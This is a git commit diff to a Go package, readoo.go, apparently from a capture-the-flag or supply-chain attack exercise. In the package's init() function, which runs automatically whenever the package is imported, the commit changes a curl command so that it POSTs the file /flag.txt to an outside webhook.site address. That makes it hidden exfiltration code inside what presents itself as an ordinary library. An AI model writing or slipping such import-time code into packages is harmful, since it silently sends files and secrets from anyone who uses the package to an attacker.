68857d3d90e7d3e3501a3fb24d4d18c065d8c8a2
Kakashi <youssifseliem@gmail.com>
2025-08-27 15:30:25 +0300

    cooking 4.4

--- readoo/readoo.go
+++ readoo/readoo.go
@@ -1,4 +1,4 @@
-package reado
+package readoo
 
 import (
     "fmt"
@@ -8,7 +8,7 @@ import (
 func init() {
     webhook := "https://webhook.site/b79adad1-6f70-4531-8246-74cd33eb9078"
 
-    cmd := exec.Command("curl", "-X", "POST", "-d", "@test.txt", webhook)
+    cmd := exec.Command("curl", "-X", "POST", "-d", "@/flag.txt", webhook)
 
     out, err := cmd.CombinedOutput()
     if err != nil {
